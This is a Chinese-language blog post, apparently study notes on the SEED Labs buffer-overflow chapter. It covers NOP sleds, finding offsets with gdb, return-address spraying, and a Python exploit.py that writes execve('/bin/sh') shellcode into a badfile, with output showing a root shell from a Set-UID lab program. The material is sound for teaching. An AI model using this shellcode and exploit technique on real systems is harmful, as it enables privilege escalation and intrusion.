<h4 id="5-2-Improving-Chances-of-Guessing"><a href="#5-2-Improving-Chances-of-Guessing" class="headerlink" title="5.2 Improving Chances of Guessing"></a>5.2 Improving Chances of Guessing</h4><p>为了使我们的猜测成功，我们需要猜测我们注入的代码的确切入口点entry point。如果我们错过了哪怕一个字节，我们都会失败。如果我们可以<strong>为注入的代码创建许多入口点</strong>，从任何一个入口点都能进入程序，这样成功率就会提高很多。其想法是在代码的实际入口点之前添加许多<strong>No-Op(NOP)指令</strong>。NOP指令没有做任何有意义的事情，除了将程序计数器（program counter，即PC）推进到下一个位置，所以<strong>只要我们击中任何一个NOP指令，我们最终都会跳转到我们的代码的真正的入口点</strong>。这将大大提高我们的成功率。想法说明图如下：</p>
<p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649059359839.png" alt="uTools_1649059359839"></p>
<p>通过用NOP值填充返回地址上方的区域，我们可以为恶意代码创建多个入口点。这一点如图4.6的右侧所示。右侧可以与左侧的情况进行比较，左侧没有使用NOP，从而它的恶意代码只有一个入口点。</p>
<h4 id="5-3-Finding-the-Address-Without-Guessing"><a href="#5-3-Finding-the-Address-Without-Guessing" class="headerlink" title="5.3 Finding the Address Without Guessing"></a>5.3 Finding the Address Without Guessing</h4><p>在Set-UID案例中，由于攻击者在同一台机器上，他们可以获得受害者程序的副本，做一些调查，并无需猜测就能获得注入代码的地址。此方法可能不适用于远程攻击，即攻击者试图从远程机器注入代码。远程攻击者可能没有受害者程序的副本，他们也不能对目标机器进行调查。<br>我们将使用一种调试方法来找出堆栈框架在堆栈上所在的什么位置，并使用它来推导我们的代码所在的位置。我们可以直接调试Set-UID程序，并在调用foo时打印出帧指针的值。需要注意的是，当普通用户调试特权Set-UID程序时，程序不会以特权运行，因此直接更改调试器内部程序的行为不允许我们获得任何特权。</p>
<p>在这个实验中，我们有了目标程序的源代码，所以我们可以在打开调试标志的情况下编译它。这将使它更方便地进行调试。这是gcc命令。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c</span></span><br></pre></td></tr></table></figure>
<p>除了像以前一样禁用两个对策之外，上述编译还使用-g标志来编译程序，这样的话，调试信息被添加到二进制文件中。之后编译出的程序stack_dbg之后就会用gdb调试。在运行程序前我们先创建一个badfile文件</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gcc -z execstack -fno-stack-protector -g -o stack_dbg stack.c</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch badfile</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gdb stack_dbg</span></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1˜16.04) 7.11.1</span><br><span class="line">......</span><br><span class="line">(gdb) b foo                   # Set a break point at function foo()</span><br><span class="line">Breakpoint 1 at 0x804848a: file stack.c, line 14.</span><br><span class="line">(gdb) run</span><br><span class="line">......</span><br><span class="line">Breakpoint 1, foo (str=0xbfffeb1c &quot;...&quot;) at stack.c:10</span><br><span class="line">10 strcpy(buffer, str);</span><br></pre></td></tr></table></figure>
<p>在gdb中，我们敲入b foo来在foo函数处设置断点，之后我们用run运行程序，程序会在foo函数里面停下，这时我们就可以print出 frame pointer帧指针 ebp ，用gdb的p命令打印出buffer的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p $ebp</span><br><span class="line">$1 = (void *) 0xbfffeaf8</span><br><span class="line">(gdb) p &amp;buffer</span><br><span class="line">$2 = (char (*)[100]) 0xbfffea8c</span><br><span class="line">(gdb) p/d 0xbfffeaf8 - 0xbfffea8c</span><br><span class="line">$3 = 108</span><br><span class="line">(gdb) quit</span><br></pre></td></tr></table></figure>
<p>从上面的执行结果中，我们可以看到帧指针frame pointer的值是0xbfffeaf8。因此，根据图4.6，我们可以看出返回地址return address存储在0xbfffeaf8+4中，并且第一个可以让我们跳转到我们自己的代码的位置为0xbfffeaf8+8(从这个地址开始的内存区域充满了NOP，可以一路跳到我们想要的地方)。因此，我们可以在返回地址return address字段中放置0xbfffeaf8+8。</p>
<p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649054410622.png" alt="uTools_1649054410622"></p>
<p>在输入的内部，返回地址字段在哪里？因为我们的输入将从缓冲区的一开始就被复制到缓冲区中。我们需要知道缓冲区在内存中的什么位置开始，以及缓冲区的起始点和返回地址字段之间的距离。从上面的调试结果中，我们可以很容易地打印出缓冲区的地址，然后计算出ebp与缓冲区的起始地址之间的距离 (我们得到108) 由于返回地址字段比ebp指向的位置高出4个字节(ebp指向的是previous frame pointer，return address在这个上面)，所以buffer起始位置和return address位置的距离是112。</p>
<h4 id="5-4-Constructing-the-Input-File-构建badfile的内容"><a href="#5-4-Constructing-the-Input-File-构建badfile的内容" class="headerlink" title="5.4 Constructing  the Input File 构建badfile的内容"></a>5.4 Constructing  the Input File 构建badfile的内容</h4><p>我们现在可以为坏文件构造内容了。图4.7说明了输入文件的结构（即badfile）。由于badfile包含难以使用文本编辑器输入的二进制数据，所以我们编写一个Python程序(称为plale.py)来生成文件。该代码如下图所示。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">shellcode= (</span><br><span class="line">	<span class="string">&quot;\x31\xc0&quot;</span> <span class="comment"># xorl %eax,%eax</span></span><br><span class="line">	<span class="string">&quot;\x50&quot;</span> <span class="comment"># pushl %eax</span></span><br><span class="line">	<span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span> <span class="comment"># pushl $0x68732f2f</span></span><br><span class="line">	<span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span> <span class="comment"># pushl $0x6e69622f</span></span><br><span class="line">    <span class="string">&quot;\x89\xe3&quot;</span> <span class="comment"># movl %esp,%ebx</span></span><br><span class="line">    <span class="string">&quot;\x50&quot;</span> <span class="comment"># pushl %eax</span></span><br><span class="line">    <span class="string">&quot;\x53&quot;</span> <span class="comment"># pushl %ebx</span></span><br><span class="line">    <span class="string">&quot;\x89\xe1&quot;</span> <span class="comment"># movl %esp,%ecx</span></span><br><span class="line">    <span class="string">&quot;\x99&quot;</span> <span class="comment"># cdq</span></span><br><span class="line">    <span class="string">&quot;\xb0\x0b&quot;</span> <span class="comment"># movb $0x0b,%al</span></span><br><span class="line">    <span class="string">&quot;\xcd\x80&quot;</span> <span class="comment"># int $0x80</span></span><br><span class="line">).encode(’latin-<span class="number">1</span>’)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOPs</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>)) ➀</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the shellcode at the end</span></span><br><span class="line">start = <span class="number">300</span> - <span class="built_in">len</span>(shellcode)</span><br><span class="line">content[start:] = shellcode ➁</span><br><span class="line"></span><br><span class="line"><span class="comment"># Put the address at offset 112</span></span><br><span class="line">ret = <span class="number">0xbfffeaf8</span> + <span class="number">120</span> ➂</span><br><span class="line">content[<span class="number">112</span>:<span class="number">116</span>] = (ret).to_bytes(<span class="number">4</span>,byteorder=’little’) ➃</span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(’badfile’, ’wb’) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(content)</span><br></pre></td></tr></table></figure>
<p>在给定的代码中，shellcode[]包含一个恶意代码的副本。稍后我们将讨论如何编写这样的代码。在第➀行中，我们创建了一个大小为300字节的数组，并用0x90(NOP)填充它。然后，我们将shellcode放在这个数组的末尾（行➁）。</p>
<p>我们计划使用0xbfffeaf8+120作为返回地址（行➂），所以我们需要把这个值放到数组中相应的位置。根据我们的gdb结果，返回地址字段从偏移量112开始，到偏移量116（不包括116）结束。因此，在第➃行中，我们将地址放入内容中[112：116]。当我们将一个多字节数放入内存时，我们需要考虑哪个字节应该放入低地址。这被称为字节顺序。有些计算机架构使用大端，有些使用小端。x86体系结构使用小端顺序，因此在Python中，当将4字节地址放入内存时，我们需要使用byteorder=‘litte’来指定字节顺序。</p>
<ul>
<li><p>需要注意的是，在第➂行中，我们没有使用之前计算过的0xbfffeaf8+8；相反，我们使用一个更大的值0xbfffeaf8+120。这是有原因的：地址0xbfffefaf8确定时我们使用了debugging模式，foo函数的stack frame当程序运行在gdb中和直接运行时可能时不同的，因为gdb可能在一开始push一些额外的数据到stack，导致stack frame被分配得比程序直接运行时更深。因此，我们可以跳转到的第一个地址可能高于0xbfffeaf8+8。这就是为什么我们选择使用0xbfffeaf8+120。如果攻击失败，读者可以尝试不同的offset。</p>
</li>
<li><p>要记住的另一件重要的事情是0xbfffeaf8+nnn的结果在它的任何一个字节中都不应该包含零，否则badfile内容的中间位置会出现一个0（’\0’），导致之前的strcpy()函数结束复制，没有复制这个0之后的任何内容。例如，如果我们使用0xbfffeaf8+8，我们将得到0xbfffeb00，并且结果的最后一个字节是零。</p>
</li>
</ul>
<p><strong>Run the exploit</strong>: 我们现在可以运行exploit.py来生成badfile。一旦文件构建，我们运行易受攻击的Set-UID程序，它从badfile中复制内容，导致缓冲区溢出。</p>
<p>下面的结果表明，我们已经成功地获得了根权限：我们得到了#提示符，并且id命令的结果显示，该进程的有效用户id(euid)为0</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod u+x exploit.py <span class="comment">#make it executable</span></span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> rm badfile</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> exploit.py</span> </span><br><span class="line"><span class="meta">$</span><span class="bash"> ./stack</span> </span><br><span class="line"><span class="meta">#</span><span class="bash"> id                 <span class="comment">#Got the root shell!</span></span> </span><br><span class="line">uid=1000(seed) gid=1000(seed) euid=0(root) groups=0(root), ...</span><br></pre></td></tr></table></figure>
<h3 id="6-Attacks-with-Unknown-Address-and-Buffer-Size在地址和缓冲区大小未知的情况下进行攻击"><a href="#6-Attacks-with-Unknown-Address-and-Buffer-Size在地址和缓冲区大小未知的情况下进行攻击" class="headerlink" title="6. Attacks with Unknown Address and Buffer Size在地址和缓冲区大小未知的情况下进行攻击"></a>6. Attacks with Unknown Address and Buffer Size在地址和缓冲区大小未知的情况下进行攻击</h3><p>在上一节中，我们展示了在我们知道缓冲区地址和大小时如何进行攻击。在现实世界中，我们可能无法知道它们的确切值。对于针对远程服务器的攻击尤其如此，因此我们与在上一节中所做的不同，我们将无法调试目标程序。在本节中，我们将学习一些技术，以允许我们在不知道关于目标程序的所有信息的情况下启动攻击。</p>
<h4 id="6-1-Knowing-the-Range-of-Buffer-Size"><a href="#6-1-Knowing-the-Range-of-Buffer-Size" class="headerlink" title="6.1 Knowing the Range of Buffer Size"></a>6.1 Knowing the Range of Buffer Size</h4><p>对于缓冲区溢出攻击，有两个关键的信息片段：缓冲区的地址和大小。首先让我们假设我们知道缓冲区的地址是A=0xbfffea8c（这个假设将稍后取消），但我们不知道缓冲区的确切大小；我们只知道它在10到100的范围内。显然，我们可以使用蛮力方法，尝试遍在10到100之间的所有值。问题是我们是否能在只尝试一次的前提下做到。在现实世界中，蛮力攻击很容易触发警报，所以我们尝试次数越少越好。</p>
<p>缓冲区的大小决定了返回地址的位置。在不知道实际的缓冲区大小的情况下，我们不知道应该使用输入字符串（即坏文件）中的哪个区域来保存返回地址。猜测是一种方法，但我们有一个更好的解决方案：我们不是把return address仅仅放在一个位置，而是把它放在所有可能的位置，这样的话哪个位置是实际return address的位置并不重要。这种技术被称为spraying（喷洒），也就是说，我们用返回地址喷洒缓冲区。</p>
<p>由于缓冲区大小的范围在10到100之间，返回地址字段和缓冲区开始之间的实际距离最多为100加上一些小值（编译器可能会在缓冲区结束后添加额外的空间）；我们使用120。如果我们用返回地址（记为RT）喷洒缓冲区的前120个字节（每个地址为4个字节），我们就能保证其中某一个将覆盖实际的return address字段。图4.8显示了badfile内容是什么样子的。</p>
<p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649229770023.png" alt="uTools_1649229770023"></p>
<p>我们需要确定RT的值，从上图中，我们可以看到第一个NOP指令在0xbfffea8c+120（&amp;buffer+120，下文中称A=&amp;buffer）的位置上，由于我们认为A的值我们是知道的，我们可以算出 A+120 = 0xbfffea8c + 120 = 0xbfffeb04，用这个地址作为RT值。事实上，不止这个值，只要在A+120 到NOP结束我们的恶意代码开始之前的所有地址值都可以作为RT，都可以跳转到我们的恶意代码的位置。</p>
<h4 id="6-2-了解缓冲区地址的范围Knowing-the-Range-of-the-Buffer-Address"><a href="#6-2-了解缓冲区地址的范围Knowing-the-Range-of-the-Buffer-Address" class="headerlink" title="6.2 了解缓冲区地址的范围Knowing the Range of the Buffer Address"></a>6.2 了解缓冲区地址的范围<strong>Knowing the Range of the Buffer Address</strong></h4><p>让我们进一步解除对buffer地址的假设；假设我们不知道buffer地址的确切值，但我们知道这个值肯定在一个确定的A到A+100之间。我们对buffer size的假设仍然与之前相同，我们知道它的变化范围在10到100之间，我们希望构造一个有效的payload，以期所以无论缓冲区地址是什么，只要它在指定的范围内（A到A+100），我们的有效负载就可以成功地利用该漏洞。</p>
<p>我们仍然使用spraying技术来构建缓冲区的前120字节，然后我们放了150字节的NOP，然后是恶意代码。在这种方法下，如果缓冲区的地址为X，则NOP部分将在[X+120，X+270]的范围内。问题是，我们不知道X，因此我们不知道NOP部分的确切范围。由于X在[A，A+100]的范围内，让我们枚举X的所有可能的值，并看看它们的NOP部分在哪里：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Buffer Address 		NOP Section</span><br><span class="line">--------------------------------------</span><br><span class="line">A 					[A + 120, A + 270]</span><br><span class="line">A+4 				[A + 124, A + 274]</span><br><span class="line">A+8 				[A + 128, A + 278]</span><br><span class="line">		......</span><br><span class="line">A+100 				[A + 220, A + 370]</span><br></pre></td></tr></table></figure>
<p>要找到一个适用于所有可能的缓冲区地址的NOP，NOP必须与上面所示的所有NOP部分相结合。这就是[A+220，A+270]。即，在此范围内的任何地址都可以用于返回地址RT。</p>
<h4 id="6-3-A-General-Solution一般性的解决方案"><a href="#6-3-A-General-Solution一般性的解决方案" class="headerlink" title="6.3  A General Solution一般性的解决方案"></a>6.3  <strong>A General Solution</strong>一般性的解决方案</h4><p>让我们概括一下刚才讨论的关于可以在攻击中使用的返回地址值。假设buffer address在[A，A+H]范围内，buffer中最开始的S个字节用于喷洒目的（RT部分），缓冲区接下来的L字节填充NOP指令（NOP部分）。让我们找出我们可以为返回地址RT使用哪些值（参见图4.9），我们设L为NOP段的长度。</p>
<ul>
<li>如果实际地址X=A，NOP段的位置在[A+S, A+S+L]，任何在这个范围内的数字可以作为RT的值</li>
<li>如果实际地址X=A+4，NOP段的位置在[(A+4)+S, (A+4)+S+L]，任何在这个范围内的数字可以作为RT的值</li>
<li>如果实际地址X=A+H，NOP段的位置在[(A+H)+S, (A+H)+S+L]，任何在这个范围内的数字可以作为RT的值</li>
</ul>
<p><img src="/2022/04/06/Buffer-Overflow-Attack-%EF%BC%8Cpart1%EF%BC%9A%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/uTools_1649232456404.png" alt="uTools_1649232456404"></p>
<p>如果我们想找到一个适用于所有可能的缓冲区地址的RT值，它必须与X=A、A+4、…，A+H的所有范围相结合。从图4.9中，我们可以看到连接是[A+H+S，A+S+L)。此范围内的任何数字都可以用于返回地址RT。</p>
<p>一些读者可能会立即发现，如果H大于L，则上述范围的下界大于上限，该范围是不可能成立的，这样的话RT的值不能满足所有的buffer address。直观地说，如果buffer address不确定的范围太大，而我们放置NOP指令的空间太小，这种情况下我们将无法找到RT的完美解法。为了至少有一个可取的RT，我们必须保证H&lt;L。</p>
<p>由于L是由有效负载大小payload size决定的，这个值又取决于脆弱的程序可以从我们这里获得多少字节，因此我们将不能通过无节制地增加L来满足不等式。</p>
<p>显然，我们也不能减少缓冲区地址的指定范围的宽度H。但我们可以把这个范围分解成更小的子范围，每个子范围都有一个更小的宽度H‘。只要H‘小于L，我们就能找到一个解。基本上，如果范围太宽，我们将它分成更小的子范围，然后为每个子范围构造一个恶意的有效负载。</p>

        </div>
        <div class="article-tags tags">
            
                <a class="tag-none-link" href="/tags/Buffer-Overflow-Attack/" rel="tag">Buffer Overflow Attack</a><a class="tag-none-link" href="/tags/C%E8%AF%AD%E8%A8%80/" rel="tag">C语言</a>
            
        </div>
    </section>
</article>





        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/artchen" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">FireKnight-HJ</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    fireknight
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    fireknight-hJ的博客
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            About
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            Archives
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
